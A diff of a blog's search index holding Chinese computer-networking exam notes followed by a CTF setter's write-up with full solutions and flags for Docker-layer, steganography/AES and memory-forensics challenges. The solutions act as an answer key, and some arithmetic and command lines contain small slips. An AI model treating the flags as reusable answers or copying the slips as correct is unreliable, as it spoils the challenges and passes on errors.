+2字节的十六进制000D–&gt; 十进制13
+
+
+用户数据报的总长度
+对应长度字段，这里的长度字段是总长度&#x3D;数据长度+ UDP 首部长度001C转为十进制–&gt;28
+
+
+数据长度
+数据长度 &#x3D; 用户数据报总长度 - UDP 首部长度UDP首部长度固定为8字节28−8&#x3D;20字节
+
+
+这个分组是从客户到服务器方向的，还是从服务器到客户方向的
+源端口是 52100，这是一个客户端使用的临时端口，临时端口&gt;1023目的端口是 13，这是一个熟知端口，熟知端口&lt;1023目的端口是服务器端口，源端口是客户端端口,这个分组是从 客户到服务器 方向的
+
+
+客户进程是什么
+目的端口 13 在 TCP&#x2F;UDP 中通常对应 Daytime 协议，客户进程是 使用 daytime 服务的客户端程序
+
+
+
+录音提及问答知识点：第一章OSI七层、TCP &#x2F;IP四层、和书上五层体系结构的对应关系
+
+
+OSI 七层模型
+五层体系结构
+TCP&#x2F;IP 四层模型
+
+
+
+应用层
+应用层
+应用层
+
+
+表示层
+
+
+
+
+会话层
+
+
+
+
+运输层
+运输层
+运输层
+
+
+网络层
+网络层
+网际层
+
+
+数据链路层
+数据链路层
+网络接口层
+
+
+物理层
+物理层
+
+
+
+如何衡量计算机网络的性能指标速率、吞吐量、带宽、&#x3D;&#x3D;时延&#x3D;&#x3D;、时延带宽积、往返时间RTT、利用率
+时延的计算&#x3D;&#x3D;注意：在进行计算时要注意单位换算&#x3D;&#x3D;发送时延：传播时延：处理时延：处理分组花费的时间排队时延：它的时延在四者中最大，当网络通信量很大时会发生队列溢出，分组丢失，相当于排队时延无穷大
+三种交换方式定量对比：电路交换和分组交换，报文交换（已被抛弃，一般是前两者比较）
+
+电路交换：总时间T &#x3D; 建立连接时间 + 发送时延 +传播时延  &#x3D; t建立连接 （有时候题目会忽略，那么就不用加上这个）+ (报文总长度&#x2F;数据传输速率、带宽 ) + 链路数量 * 单链路的传播时延
+
+
+分组交换：总时间T  &#x3D; 发送总时间 + 最后一个分组的转发耗时&#x3D; 发送总时间 + (链路数-1) * （分组长度+分组首部长度）&#x2F; 数据传输速率
+
+例题：要在源点和终点之间传送 M&#x3D;1000的报文。路径上有 2 个路由器（即 k&#x3D;3 段链路）。链路速率 R&#x3D;1000bps，每段链路传播时延忽略不计。电路交换：建立连接需 S&#x3D;0.5S。分组交换：分组数据长 p&#x3D;100 bits，首部 h&#x3D;20bits。求两种方式下的总时延，并比较哪种更快。
+
+电路交换：T &#x3D; t建立时间 + 发送时延 + 传播时延 （题目说忽略不计）   &#x3D;t建立时间 + 发送时延   &#x3D;S + M &#x2F; R （报文长度&#x2F; 速率）   &#x3D; 0.5s + 1000&#x2F;1000 &#x3D; 1.5s 此处的传播时延被忽略了，要是没有忽略，该这么计算–&gt; 传播时延 &#x3D;(链路数、即路由器数加1) k * d (每段传播时延 )
+ 分组交换： 分组总数 L&#x3D; 报文长度 &#x2F; 分组数据长 &#x3D; M &#x2F; p &#x3D; 1000 &#x2F; 100 &#x3D; 10组 单个分组长度 g&#x3D; 分组数据长 +首部 &#x3D; p + h &#x3D; 100 + 20 &#x3D; 120bits 发送总时间 &#x3D; （单个分组长度* 分组总数）&#x2F; 速率 &#x3D; g * L  &#x2F; R &#x3D; 10 * 120 &#x2F; 1000&#x3D; 1.2s 最后一个分组的转发耗时 &#x3D; 最后一个分组经过k-1的路由器转发 * 最后一个分组的长度&#x2F;速率 &#x3D; (k-1) * g &#x2F; R &#x3D; (3-1) *  120&#x2F; 1000 &#x3D; 0.24sT &#x3D; 发送总时间 + 最后一个分组的转发耗时  &#x3D; 1.2s + 0.24s
+
+&#x3D;&#x3D;注意：看清题目定义的报文长度是否包含首部 ， 分组数据长是纯数据还是包括了首部的总长&#x3D;&#x3D;
+数据封装与解封装首部尾部增减数据从最顶层往下一定是不断增加头部和尾部的过程，从物理层往上是不断减首部和尾部的过程见第一章习题 1-19
+第二章奈氏准则结论：在带宽为W的信道上 ，不考虑噪声影响，码源传输最高速率是2W
+香农公式信噪比：S&#x2F;N —— 信号平均功率 &#x2F;噪声平均功率
+香农公式：信道极限信息传输速率C
+CDMA的原理及计算过程原理：所有用户在同一时间、同一频段上发送信号，依靠各自唯一且相互正交的码片序列来区分，接收端通过计算内积等相关运算从叠加信号中解调出目标用户的数据。
+计算过程见习题2-16
+第三章面向点对点PPP协议成帧特殊在含有进行帧定界的字段如何进行帧定界，帧和帧之间有分界标识OSTE，2个0之间包含6个1（0 111111 0）
+透明传输（只在PPP协议）保证传输数据中间没有两个0之间加6个1的组合，被错当成帧定界字段解决方法：零比特填充法：发送数据时只要发现5个连续的1，那么就自动在后面加入一个0，然后在接收数据时，发现5个连续的1，检查后面的bit，如果是0，则自动删除这个0；如果是1，若1后面接的是0，则是帧定界标志字段01111110表示一帧结束，若1后面接的是1，则发生了传输错误字节填充&#x2F;字符法：添加特殊的转义字符ESC&#x3D;&#x3D;注意：以太网没有透明传输，因为以太网发送每一帧的时候，帧和帧之间会有一定时间间隔，时间间隔就是一个天然的帧的分界线&#x3D;&#x3D;
+差错检测循环冗余检验CRCCRC原理：发送端利用模2除法将原始数据除以约定的生成多项式，将得到的余数FCS附加在数据后发送；接收端用同样的多项式对收到的完整数据进行模2除法，若余数为0则判定传输无差错，否则判定出错并丢弃。例题以CRC-4为例：
+
+对于CRC-4，它的生成多项式P最高次幂为4，CRC-32的最高次幂为32，以此类推
+
+确定参数M &#x3D; 1011001P最高次幂&#x3D; 4生成多项式P转换为二进制比特：10011 
+
+M后面补0因为是CRC-4，则M后面补4个0，如果是CRC-32，那么就是M后面补32个0M&#x3D; 1011001 0000
+
+模2除法将M与P的二进制比特进行异或（记得从前面开始）进行第一次异或1011001 000010011–&gt;前五位00101–&gt;删去前面没意义的0–&gt; 101–&gt;因为 P的二进制比特10011是五位，那么从M后面再拉两位下来01–&gt;10101再进行第二次异或1010110011–&gt;00110–&gt;去掉前面没意义的0–&gt;110–&gt;从M后面再下拉两位00–&gt; 11000进行第三次异或1100010011–&gt;01011–&gt;去掉前面无意义的0–&gt;1011–&gt;CRC-4的余数的位数是4位（以此类推CRC-32是32位），此处异或得到的结果1011为4位，除法结束–&gt;余数、FCS校验码为1011
+
+
+
+面向广播信号以太网CSMA&#x2F;CD协议解决以太网站点多的问题核心口诀：先听后发，边发边听，冲突停发，随机重发。信号传播往返时间 2τ 。如果在这个时间内没检测到冲突，才算发送成功。
+二进制指数退避算法发生碰撞后，不能马上重发，否则又会撞。
+
+算法：
+
+基本退避时间：2τ
+k &#x3D; min(重传次数，10)，重传超过10次，k就固定为10
+从{0, 1, … , (2的k次方 - 1)}中随机取一个数r
+重传等待时间 &#x3D; r * 基本退避时间2τ
+
+
+例题：主机 A 和主机 B 在同一个 10Mbps 的以太网段上通信。已知该网络的基本退避时间（即争用期 2τ）为 51.2 μs。主机 A 发送一个数据帧，发生碰撞。随后主机 A 按照二进制指数退避算法进行重传，但连续发生了 12 次碰撞（即这是第 12 次碰撞后的重传等待）。
+
+1. 此时参数 k的值是多少？连续进行12次碰撞，重传12次k &#x3D; min(12,10) &#x3D; 102. 主机 A 从哪个整数集合中随机选取退避倍数 r ？
+
+公式： {0,1,…,2的k次方−1}- k&#x3D;10，2的10 次方 -1 &#x3D; 1024 -1 &#x3D; 1023集合为 {0,1,2,…,1023}3. 主机 A 本次重传的最大可能等待时间是多少？计算最大的可能等待时间，r就要取集合最大的值1023T​&#x3D;r×基本退避时间 &#x3D; 1023 * 2τ &#x3D; 1023 * 51.2 μs &#x3D; 2377.6 μs≈52.38 ms
+
+
+网桥、交换机自学习功能
+第四章成帧问题见第三章成帧问题
+IP首部格式（20个字节的固定部分）标志占3位，只有前两位有意义片偏移占13位
+IP的分片（大IP分成小分组）每个分片能装的最大数据量 &#x3D; MTU−20，这个20为首部的长度&#x3D;&#x3D;注意：（MTU−20）必须是 8 的整数倍，如果 MTU−20 不是 8 的倍数，必须向下取整到最近的 8 的倍数。&#x3D;&#x3D;例题：一个 IP 数据报总长度为 4000 字节（首部固定 20 字节，数据 3980 字节）。现在要经过一个 MTU &#x3D; 1500 字节 的网络。
+
+
+需要分成几个片？每个分片能装的数据：1500−20&#x3D;1480 字节1480&#x2F;8 &#x3D; 185，刚好整除，则每个分片的数据长度就是1480分片数量 3980 &#x2F; 1480 &#x3D; 2.68…， 需要3个分片
+
+
+得到：注意：- 除了最后一个分片，前面所有分片的 MF 都必须是 1。
+
+
+
+分片
+数据长度
+总长度 (首部+数据)
+片偏移 (数据位置 ÷ 8)
+MF标志
+
+
+
+第 1 片
+1480
+1480 + 20 &#x3D; 1500
+0 ÷ 8 &#x3D; 0
+1
+
+
+第 2 片
+1480
+1480 + 20 &#x3D; 1500
+1480 ÷ 8 &#x3D; 185
+1
+
+
+第 3 片
+3980 - 1480×2 &#x3D; 1020
+1020 + 20 &#x3D; 1040
+2960 ÷ 8 &#x3D; 370
+0
+
+
+CIDR网络划分
+划分成四个相同的子网见习题4-33
+
+划分成四个不同的子网将习题4-33条件改成划分四个不同的子网，条件如下：
+
+
+
+子网 A：需要 28 台主机
+子网 B：需要 12 台主机
+子网 C：需要 4 台主机
+子网 D：需要 2 台主机
+已知136.23.12.64&#x2F;26，主机号6位，总的地址数就是2的6次方&#x3D; 64个地址，地址的范围为136.23.12.64-136.23.12.127原则：先分大块，再分小块
+
+划分子网A公式：2的n次方−2≥28，减2是减去全0和全1的两个地址–&gt; n &#x3D; 5(32个地址，30个可用地址)–&gt;主机位为5位–&gt;网络前缀网络号32-5 &#x3D; 27–&gt;网络地址块为136.23.12.64&#x2F;27–&gt;范围(64, 64+32-1&#x3D;95)–&gt;可用主机(64+1, 95-1)减去全1和全0
+划分子网B2的n次方−2≥12–&gt;n &#x3D; 4(地址16个，可用地址14个)–&gt;网络前缀32-4 &#x3D; 28–&gt;网络地址块为136.23.12.96&#x2F;28–&gt;范围（96， 96+16-1&#x3D; 111）–&gt; 可用主机(96+1, 111-1)以此类推
+
+
+
+
+路由协议
+
+
+路由协议
+和谁进行交互
+什么时候进行交互
+交互的内容
+基于什么协议
+
+
+
+RIP
+相邻的路由器
+每隔一定的时间间隔
+自己的路由表
+UDP
+
+
+OSPF
+用洪泛法向网络上所有的其他路由器
+链路状态发生变化或每隔一段时间
+与自己直连的网络拓扑确实发生了改变的地方
+IP
+
+
+BGP
+相邻的路由器
+网络拓扑发生变化
+与自己直连的网络拓扑确实发生了改变的地方
+TCP
+
+
+差错检测问题
+
+
+协议
+计算范围
+计算
+
+
+
+IP
+首部
+分组求和
+
+
+UDP
+首部+数据部分
+分组求和
+
+
+TCP
+伪首部+首部+数据部分
+分组求和
+
+
+RIP算法：
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+第五章实现可靠传输的方法1.超时重传，正确接收到数据返回一个ACK2.序号机制，进行编号，防重传和乱序3.差错检测4.确认机制
+流量控制问题用接收窗口来抑制发送方的发送速率
+拥塞问题稍微看眼书这个部分（快恢复&#x2F;重传算法）快重传算法当接收方收到一个失序的数据段时，它会立即发送一个针对“期望收到的下一个字节序号”的重复ACK，发送方一旦连续收到三个相同的重复ACK，就推断出某个数据段很可能已经丢失，于是立即重传该数据段，而不必等待重传计时器超时。快恢复算法：当发送方连续收到 3 个重复 ACK 并触发“快重传”后，快恢复算法就会接管控制权，具体步骤如下：
+
+将阈值ssthresh&#x2F;2，cwnd&#x3D; 新的ssthresh + 3* MSS（最大报文段长度）
+每收到一个重复ACK， cwnd+1个MSS
+收到对重传段的确认ACK后，cwnd&#x3D;当前ssthresh，退出快恢复
+
+掌握慢开始、拥塞避免的拥塞窗口变化规律——见习题5-38
+TCP三次握手和四次挥手
+第六章（不考大题）DNS的查询方式
+递归查询
+迭代查询
+
+HTTP1.0、2.0、3.0是怎么变化的
+
+
+协议
+特点
+
+
+
+HTTP1.0
+一次性连接，非持久性连接
+
+
+HTTP1.1
+持久性连接
+
+
+HTTP2.0
+对报文传输格式进行了根本性变革
+
+
+HTTP3.0
+将传输层从 TCP 迁移到了基于 UDP 的 QUIC 协议
+
+
+FTP、TFTP协议有什么区别
+
+
+特性
+FTP
+TFTP
+
+
+
+传输层
+TCP
+UDP
+
+
+端口
+20（数据）, 21（控制）
+69
+
+
+认证机制
+支持（用户名&#x2F;密码）
+不支持
+
+
+连接方式
+双连接（控制+数据）
+单连接，无状态
+
+
+可靠性
+高（依赖 TCP）
+低（应用层简单确认）
+
+
+实验制作网线的基本规范直通线 ：用于连接不同层级的设备，计算机与交换机、计算机与路由器、交换机与路由器交叉线：用于连接同层级的设备，计算机与计算机直连、交换机与交换机级联、路由器与路由器直连全反线：主要用于连接设备的 Console 口，进行初始的命令行配置和调试。
+简单网络测试与分析，一些常用的网络命令
+ping测试本机与目标主机之间的连通性
+
+
+Reply from ... bytes=32 time&lt;1ms TTL=128：表示通了。
+Request timed out：请求超时，可能是不通、防火墙拦截或对方禁 ping。
+Destination host unreachable：目标主机不可达，通常是路由问题或网关没配好。
+
+
+ipconfig（Windows）&#x2F; ifconfig（Linux)查看本机的网络配置信息，检查 IP 是否在同一网段，网关是否正确配置
+tracert （Windows）&#x2F; traceroute（Linux)路由追踪。显示数据包从本机到目标主机经过的所有路由器跳数如果数据包在某一行停滞并显示 * * *，说明故障点就在该路由器或该链路
+arp -a查看和操作本机的 ARP 缓存表如果在同一局域网内 ping 不通，可以用此命令查看是否获取到了对方的 MAC 地址如果是 incomplete 或找不到对应 IP，说明二层链路有问题
+netstat显示网络连接、路由表和网络接口统计信息检查服务器端口是否在监听,排查异常连接。
+
+综合题信息传递过程主机H1给主机H2发送消息：首先，在发送端主机 H1，数据从运输层下来进入网络层时，会被加上 IP 首部，此时源 IP 地址填的是 H1 自己的 IP1，目的 IP 地址填的是最终接收方 H2 的 IP2，这两个 IP 地址在整个传输过程中是始终不变的；接着数据向下交给数据链路层，因为目的地址不等于本地地址，H1 会使用路由选择协议找到下一跳路由器R1，再调用 ARP 协议找到 下一跳R1对应的MAC地址MAC3 ，将数据封装成 MAC 帧，此时帧的源 MAC 是 MAC1，目的 MAC 是 MAC3，然后转换成10代码通过物理层发出去。当信号到达路由器 R1 后，物理层接收并交给数据链路层，R1 发现帧的目的 MAC 地址 MAC3 正是自己，于是收下这个帧，去掉帧头帧尾，把里面的 IP 数据报上交到网络层；在网络层，R1 检查 IP 包的目的地址 IP2，发现目的地址不等于本地地址，就要进行转发，它根据路由选择协议找到 “下一跳”路由器 R2，确定下一跳后，R1 再次调用 ARP 协议获取 R2 对应的MAC地址 MAC5 ，然后重新将 IP 数据报封装成新的 MAC 帧，此时新帧的源 MAC 变成了 R1 的出口 MAC4，目的 MAC 变成了 R2 的入口 MAC5，但里面的 IP 包头依然是 IP1 到 IP2，最后通过物理层转发出去。路由器 R2 的处理过程与 R1 类似，它收到帧后发现目的 MAC 是 MAC5，就收下并去掉帧头帧尾交给网络层；检查目的地址仍不等于本地地址，根据路由选择协议找到发现下一跳就是目标主机 H2；于是 R2 再次调用 ARP 协议找到 H2 的 MAC2 地址，再次重新封装成帧，源 MAC 改为 R2 的出口 MAC6，目的 MAC 改为 H2 的 MAC2，然后发送出去。最后，主机 H2 的物理层收到信号交给数据链路层，发现目的 MAC 地址 MAC2 是自己，便收下并去掉帧头帧尾，将 IP 数据报上交网络层；网络层检查发现目的 IP 地址 IP2 正是自己，于是去掉 IP 首部，将剩下的数据部分向上交付给运输层，至此，整个从 H1 到 H2 的数据转发与交付过程就完成了。
+历年试卷部分简答题
+历年试卷部分选填
+一些课堂画记知识点：
+]]></content>
+      <categories>
+        <category>课业</category>
+      </categories>
+      <tags>
+        <tag>计网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2026ctf新生赛出题笔记</title>
+    <url>/2026/07/01/2026ctf%E6%96%B0%E7%94%9F%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[2026ctf新生赛出题笔记Ghost LayerDocker中导入镜像
+docker load -i ctf_layer.tar
+
+启动
+docker run -it --rm ctf_layer /bin/bash
+
+查找有没有藏东西
+┌──(kali㉿kali)-[~/Desktop]└─$ docker run -it --rm ctf_layer /bin/bashroot@94bc849594db:/# lsbin  boot  dev  etc  hidden  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  varroot@94bc849594db:/# cd hiddenroot@94bc849594db:/hidden# ls -altotal 28drwxr-xr-x 1 root root 4096 May  5 14:27 .drwxr-xr-x 1 root root 4096 May  9 12:00 ..-rw-r--r-- 1 root root   21 May  5 14:27 cache1.txt-rw-r--r-- 1 root root   15 May  5 14:27 config1.cfg-rw-r--r-- 1 root root   24 May  5 14:27 flag.txt-rw-r--r-- 1 root root   37 May  5 14:27 log1.txt-rw-r--r-- 1 root root   37 May  5 14:27 notes.txtroot@94bc849594db:/hidden# cat flag.txtflag&#123;there_is_not_flag&#125;
+
+怎么查找也只发现了flag.txt，但这个是错误的flag
+exit退出，查看镜像历史
+docker history ctf_layer
+
+如下
+┌──(kali㉿kali)-[~/Desktop]└─$ docker history ctf_layerIMAGE          CREATED      CREATED BY                                      SIZE      COMMENTf3629ae7d826   3 days ago   CMD [&quot;sleep&quot; &quot;infinity&quot;]                        0B        buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c rm /hidden/flAg # buildkit       0B        buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c echo &quot;Random notes: nothing i…   37B       buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c echo &quot;ZmxhZ3tUaDNfRDBjazNyXzF…   42B       buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c echo &quot;CONFIG=enabled&quot; &gt; /hidd…   15B       buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c echo &quot;Temporary cache data&quot; &gt;…   21B       buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c echo &quot;DEBUG_LOG: startup sequ…   37B       buildkit.dockerfile.v0&lt;missing&gt;      3 days ago   RUN /bin/sh -c echo &quot;flag&#123;there_is_not_flag&#125;…   24B       buildkit.dockerfile.v0&lt;missing&gt;      4 days ago   RUN /bin/sh -c mkdir -p /hidden # buildkit      0B        buildkit.dockerfile.v0&lt;missing&gt;      4 days ago   RUN /bin/sh -c apt-get update &amp;&amp; apt-get ins…   354MB     buildkit.dockerfile.v0&lt;missing&gt;      4 days ago                                                   1.12GB    Imported from -
+
+导出镜像
+docker save ctf_layer -o layers.tarmkdir extract &amp;&amp; tar -xf layers.tar -C layerscd layers
+
+查看manifest.json文件
+─$ cat manifest.json[&#123;&quot;Config&quot;:&quot;blobs/sha256/f3629ae7d8266417a3bc064b303231c518a95d8da0ebe39fa0d485d0321604c1&quot;,&quot;RepoTags&quot;:[&quot;ctf_layer:latest&quot;],&quot;Layers&quot;:[&quot;blobs/sha256/b8b9963949d9d477b6a8a1fc851b15979ce79ac4486c4ca76dec8d11b6085a9e&quot;,&quot;blobs/sha256/5a5f74c00b697fa282e8044b4aaec7caa6850a621917b92c0b070f2eedd79c46&quot;,&quot;blobs/sha256/b38459665f0fdc5ac653fe919a5ba03a3f837121760d73ae888c3edb61a798c8&quot;,&quot;blobs/sha256/a2f82e0ffa579ef4ef3d7c8d966c0873866d7a7007ecb651bf4f53f18b9d3478&quot;,&quot;blobs/sha256/45d95dbd7dbe8731e03adeac2e47fc1a078b99c5ef30fb61d01ab8130102780b&quot;,&quot;blobs/sha256/58efb026e4af70184dbaa353072b9d5e7de3e2634466f16663fd43fa05f479b1&quot;,&quot;blobs/sha256/3d0ce6e7ca6707e17bd59ba54fa8d31e8f9d66299e27dcc7f98618d51ea33418&quot;,&quot;blobs/sha256/1e3b7fb1201a6809b89e9f9989997bd802ba796af7fcdbada9f3491ed9394c75&quot;,&quot;blobs/sha256/bf100e31a014e3f868cc899a894188b6aa09ab3296d57fa310333fd6db0f79aa&quot;,&quot;blobs/sha256/05f35706c7695f835e9a0992eb6401889021e95a74d933bb9ce30bcf4b6b145f&quot;],&quot;LayerSources&quot;:&#123;&quot;sha256:05f35706c7695f835e9a0992eb6401889021e95a74d933bb9ce30bcf4b6b145f&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2048,&quot;digest&quot;:&quot;sha256:05f35706c7695f835e9a0992eb6401889021e95a74d933bb9ce30bcf4b6b145f&quot;&#125;,&quot;sha256:1e3b7fb1201a6809b89e9f9989997bd802ba796af7fcdbada9f3491ed9394c75&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2560,&quot;digest&quot;:&quot;sha256:1e3b7fb1201a6809b89e9f9989997bd802ba796af7fcdbada9f3491ed9394c75&quot;&#125;,&quot;sha256:3d0ce6e7ca6707e17bd59ba54fa8d31e8f9d66299e27dcc7f98618d51ea33418&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2560,&quot;digest&quot;:&quot;sha256:3d0ce6e7ca6707e17bd59ba54fa8d31e8f9d66299e27dcc7f98618d51ea33418&quot;&#125;,&quot;sha256:45d95dbd7dbe8731e03adeac2e47fc1a078b99c5ef30fb61d01ab8130102780b&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2560,&quot;digest&quot;:&quot;sha256:45d95dbd7dbe8731e03adeac2e47fc1a078b99c5ef30fb61d01ab8130102780b&quot;&#125;,&quot;sha256:58efb026e4af70184dbaa353072b9d5e7de3e2634466f16663fd43fa05f479b1&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2560,&quot;digest&quot;:&quot;sha256:58efb026e4af70184dbaa353072b9d5e7de3e2634466f16663fd43fa05f479b1&quot;&#125;,&quot;sha256:5a5f74c00b697fa282e8044b4aaec7caa6850a621917b92c0b070f2eedd79c46&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:354249216,&quot;digest&quot;:&quot;sha256:5a5f74c00b697fa282e8044b4aaec7caa6850a621917b92c0b070f2eedd79c46&quot;&#125;,&quot;sha256:a2f82e0ffa579ef4ef3d7c8d966c0873866d7a7007ecb651bf4f53f18b9d3478&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2560,&quot;digest&quot;:&quot;sha256:a2f82e0ffa579ef4ef3d7c8d966c0873866d7a7007ecb651bf4f53f18b9d3478&quot;&#125;,&quot;sha256:b38459665f0fdc5ac653fe919a5ba03a3f837121760d73ae888c3edb61a798c8&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:1536,&quot;digest&quot;:&quot;sha256:b38459665f0fdc5ac653fe919a5ba03a3f837121760d73ae888c3edb61a798c8&quot;&#125;,&quot;sha256:b8b9963949d9d477b6a8a1fc851b15979ce79ac4486c4ca76dec8d11b6085a9e&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:1205944320,&quot;digest&quot;:&quot;sha256:b8b9963949d9d477b6a8a1fc851b15979ce79ac4486c4ca76dec8d11b6085a9e&quot;&#125;,&quot;sha256:bf100e31a014e3f868cc899a894188b6aa09ab3296d57fa310333fd6db0f79aa&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.oci.image.layer.v1.tar&quot;,&quot;size&quot;:2560,&quot;digest&quot;:&quot;sha256:bf100e31a014e3f868cc899a894188b6aa09ab3296d57fa310333fd6db0f79aa&quot;&#125;&#125;&#125;]
+
+Layers 列表按顺序就是 Docker build 的每一层，每个 layer 对应的文件在 blobs&#x2F;sha256&#x2F;
+layer 文件是 tar 包，可以直接解压
+for layer in $(jq -r &#x27;.[0].Layers[]&#x27; manifest.json); do    echo &quot;==== $layer ====&quot;    mkdir tmp    tar -xf $layer -C tmp    ls tmp/hidden 2&gt;/dev/null    cat tmp/hidden/flAg 2&gt;/dev/null    rm -rf tmpdone
+
+得到ZmxhZ3tUaDNfRDBjazNyXzFTX1cwd193b1chfQ&#x3D;&#x3D;解码：得到flag flag{Th3_D0ck3r_1S_W0w_woW!}
+真相守护者论坛保存猫咪日常文章的图片，发现是1a2b3c4d.enc_-2.png
+
+发现文件尾有添加的数据
+U2FsdGVkX1&#x2F;o+n+Uf81m8YCPYIGfVwVSYPm5WQFlO8fugvB39mMQ5AXTTCmRyBcQ
+显然稍微有点经验的朋友可能会往加解密的方向上去靠，那么就是去找这个解密的key了
+看代码之神的文章，发现了一个被定义但在代码中没被使用的变量——HIDDEN，尝试用它解密，得到明文
+（然后查看嗨朋友那个文章，发现漏了微博的昵称，经常完微博的朋友应该知道，昵称唯一。那么可以指定Gamma发的最早的两篇文章，发现有个key:{12345}，和AES的内容掺杂在文字里。初步判定是AES加密，但测试key不是12345，这算是一个小小的引导点和误导项了，虽然好像并没人被误导到）
+经过解密得到一半的flag C7y9t0_W3_G3t_1T!}
+然后看到评论区有个人的头像是二维码，扫码得到flag{M7_
+整合：flag{M7_C7y9t0_W3_G3t_1T!}
+仿生内存会找到它的电子flag吗？vol -f memdump.raw windows.info
+
+发现是windows的内存镜像文件
+查看进程列表
+vol -f memdump.raw  windows.pslist
+
+发现有两个可疑的进程： expl0re.exe 、loader.exe，找到对应的pid是3020和952
+dump下进行分析，
+vol -f memdump.raw windows.memmap --pid  --dump 
+
+发现两个dump下的进程都strings搜索不到flag，考虑到是不是被编码了，直接strings搜索ZmxhZ3
+发现了 ZmxhZ3tUaDNfUzNjcjN0X0szeV9sMXYzXzFuX20zbTByeX0=
+┌──(kali㉿kali)-[~/Desktop]└─$ strings pid.952.dmp  | grep &quot;ZmxhZ3&quot;ZmxhZ3tUaDNfUzNjcjN0X0szeV9sMXYzXzFuX20zbTByeX0=ZmxhZ3tUHZmxhZ3tUHZmxhZ3tUH
+
+解码得到flag：flag{Th3_S3cr3t_K3y_l1v3_1n_m3m0ry}
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
